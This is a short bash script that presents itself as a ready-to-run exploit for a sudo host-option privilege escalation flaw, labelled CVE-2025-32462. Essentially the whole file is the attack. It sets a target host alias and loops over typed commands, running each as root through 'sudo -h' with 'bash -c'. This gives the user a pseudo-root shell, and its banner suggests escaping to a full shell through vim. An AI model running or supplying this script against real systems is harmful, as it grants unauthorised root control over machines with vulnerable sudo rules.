#!/bin/bash

echo "[+] Sudo Host Bypass Exploit - CVE-2025-32462"
echo "[+] Discovered by: Rich Mirch"
echo "[+] Exploit by: J3rich0123"
echo "[+] Target: Linux x86_64"

TARGET_HOST="dev"   # <-- Set your vulnerable host alias here
CURRENT_HOST=$(hostname)
FOUND=0

# Optional check: warn user if the target host is the current host
if [[ "$CURRENT_HOST" == "$TARGET_HOST" ]]; then
    echo "[!] Warning: TARGET_HOST is the same as CURRENT_HOST ($CURRENT_HOST)"
fi

echo "[+] Starting pseudo-root shell on $TARGET_HOST."
echo "[+] Type 'exit' or 'quit' to leave."
echo "[+] For a real shell, type: bash"
echo "[+] Or: vim â†’ :!bash to break into a real TTY shell"

while true; do
    read -rp "root@$TARGET_HOST# " cmd
    if [[ "$cmd" == "exit" || "$cmd" == "quit" ]]; then
        echo "[+] Exiting pseudo-shell."
        break
    fi
    sudo -h "$TARGET_HOST" -- bash -c "$cmd"
done

echo "[+] Pseudo-shell session ended."
